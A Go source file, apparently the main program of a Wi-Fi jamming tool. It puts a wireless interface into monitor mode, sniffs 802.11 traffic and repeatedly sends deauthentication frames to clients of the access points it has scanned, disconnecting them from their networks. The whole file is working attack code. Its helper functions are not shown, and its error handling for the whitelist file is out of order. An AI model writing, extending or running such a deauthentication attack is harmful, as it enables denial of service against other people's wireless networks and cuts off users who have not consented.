package main

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/dauie/go-netlink/nl80211"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)


var QuitSIGINT = false

func help() {
	fmt.Printf("useage: ./%s <iface> <whitelist>\n", os.Args[0])
	os.Exit(1)
}

func handleSignals() {

	sigc := make(chan os.Signal, 1)
	go func () {
		s := <-sigc
		if s == syscall.SIGINT {
			QuitSIGINT = true
		}
	}()
	signal.Notify(sigc, syscall.SIGINT)
}

func checkComms(conn *JamConn, aps *List, clients *List, pkt gopacket.Packet) {

	if pkt == nil {
		return
	}
	radioTap := pkt.Layer(layers.LayerTypeRadioTap)
	dot11 := pkt.Layer(layers.LayerTypeDot11)
	if dot11 == nil || radioTap == nil {
		return
	}
	tap := radioTap.(*layers.RadioTap)
	dot := dot11.(*layers.Dot11)
	if dot.Flags.FromDS() || dot.Flags.ToDS() {
		return
	}
	// originated from client?
	if dot.Address1.String() == dot.Address3.String() {
		return
	}
	cliAddr := dot.Address1
	apAddr := dot.Address2
	if len(apAddr.String()) >= 16 {
		if _, ok := aps.Get(apAddr.String()[:16]); !ok {
			return
		}
	} else {
		return
	}
	var cli Client
	if v, ok := clients.Get(cliAddr.String()); ok {
		cli = (v).(Client)
	} else {
		cli = Client{ hwaddr: cliAddr, lastDeauth: time.Now() }
	}
	if time.Since(cli.lastDeauth) > time.Second * 5 {
		if err := conn.Deauth(cliAddr, apAddr, tap, dot); err != nil {
			fmt.Println("error deauthing")
		}
		cli.lastDeauth = time.Now()
	}
	clients.Add(cli.hwaddr.String(), cli)
}

func main() {

	if len(os.Args) < 3 {
		help()
	}
	handleSignals()
	monIfa, err := NewJamConn(os.Args[1])
	if err != nil {
		log.Fatalln("NewJamConn()", err)
	}
	defer func(){
		if err := monIfa.nlconn.Close(); err != nil {
			log.Fatalln("genetlink.Conn.Close()", err)
		}
	}()
	whiteList, err := getWhiteListFromFile()
	apList, err := monIfa.DoAPScan(&whiteList)
	if err != nil {
		log.Fatalln("doAPScan()", err)
	}
	if err := monIfa.SetIfaType(nl80211.IFTYPE_MONITOR); err != nil {
		log.Fatalln("JamConn.SetIfaType()", err.Error())
	}
	defer func() {
		if err := monIfa.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
			log.Fatalln("JamConn.SetIfaType()", err.Error())
		}
	}()
	if err = monIfa.SetupPcapHandle(); err != nil {
		log.Fatalln("setupPcapHandle() ", err)
	}
	defer monIfa.handle.Close()
	if err = monIfa.SetFilterForTargets(); err != nil {
		log.Fatalln("JamConn.SetFilterForTargets()", err)
	}
	if err := monIfa.SetDeviceChannel(1); err != nil {
		log.Fatalln("JamConn.SetDeviceChannel()", err.Error())
	}
	if err != nil {
		log.Fatalln("getWhiteListFromFile()", err)
	}
	var clients List
	packSrc := gopacket.NewPacketSource(monIfa.handle, monIfa.handle.LinkType())
	monIfa.SetLastChanSwitch(time.Now())
	monIfa.SetLastDeauth(time.Now())
	for !QuitSIGINT {
		packet, err := packSrc.NextPacket()
		if err != nil {
			if err.Error() != "Timeout Expired" {
				log.Fatalln("gopacket.PacketSource.NextPacket()", err.Error())
			}
		}
		checkComms(monIfa, &apList, &clients, packet)
	}
		//monIfa.ChangeChanIfPast(time.Second * 2)
}

